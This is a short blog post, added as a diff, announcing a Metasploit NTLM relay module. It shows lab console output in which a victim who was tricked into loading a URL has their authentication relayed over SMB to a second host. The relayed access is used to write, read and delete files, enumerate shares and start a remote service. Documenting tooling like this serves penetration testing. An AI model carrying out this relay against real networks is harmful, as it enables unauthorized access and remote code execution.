@@ -1,0 +1,75 @@
+---
+author: mubix
+comments: true
+date: 2012-07-10 06:02:40+00:00
+layout: post
+title: Cross-Protocol Chained Pass the Hash for Metasploit
+categories:
+- metasploit
+- pth
+- smbrelay
+---
+
+Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:
+
+![](/images/postimages/201207_pth_1.png)
+
+Twitter Link: [https://twitter.com/webstersprodigy/status/222529916783169536](https://twitter.com/webstersprodigy/status/222529916783169536)
+
+Which has a link to here: [https://github.com/rapid7/metasploit-framework/pull/589](https://github.com/rapid7/metasploit-framework/pull/589)
+
+Demo / Example resource files: [https://skydrive.live.com/?cid=19794fac33285fd5&resid=19794FAC33285FD5!170&id=19794FAC33285FD5%21170](https://skydrive.live.com/?cid=19794fac33285fd5&resid=19794FAC33285FD5!170&id=19794FAC33285FD5%21170)
+
+You can pull the fork w/ branch from here: [https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay](https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay)
+
+And as soon as you do you can start doing this (**_using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded_**):
+
+163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay'd auth. It looks as though multiple targets can be used as relay targets but I haven't tested this out yet.
+
+```
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_put' from 172.16.10.163:52327
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt written
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_get' from 172.16.10.163:52328
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182
+[*] 172.16.10.163 http_ntlmrelay - ----Contents----
+[*] 172.16.10.163 http_ntlmrelay - hi ima secret
+[*] 172.16.10.163 http_ntlmrelay - ----End Contents----
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_enum' from 172.16.10.163:52329
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ ADMIN$ C$
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_ls' from 172.16.10.163:52330
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$
+[*] 172.16.10.163 http_ntlmrelay - .rnd
+[*] 172.16.10.163 http_ntlmrelay - PerfLogs
+[*] 172.16.10.163 http_ntlmrelay - config.sys
+[*] 172.16.10.163 http_ntlmrelay - inetpub
+[*] 172.16.10.163 http_ntlmrelay - xampp
+[*] 172.16.10.163 http_ntlmrelay - ProgramData
+[*] 172.16.10.163 http_ntlmrelay - MSOCache
+[*] 172.16.10.163 http_ntlmrelay - secret.txt
+[*] 172.16.10.163 http_ntlmrelay - autoexec.bat
+[*] 172.16.10.163 http_ntlmrelay - Windows
+[*] 172.16.10.163 http_ntlmrelay - Users
+[*] 172.16.10.163 http_ntlmrelay - Program Files
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_rm' from 172.16.10.163:52332
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt deleted
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request '/smb_pwn' from 172.16.10.163:52333
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle...
+[*] 172.16.10.163 http_ntlmrelay - Creating a new service
+[*] 172.16.10.163 http_ntlmrelay - Closing service handle...
+[*] 172.16.10.163 http_ntlmrelay - Opening service...
+[*] 172.16.10.163 http_ntlmrelay - Starting the service...
+```
+
+Let the fun begin...
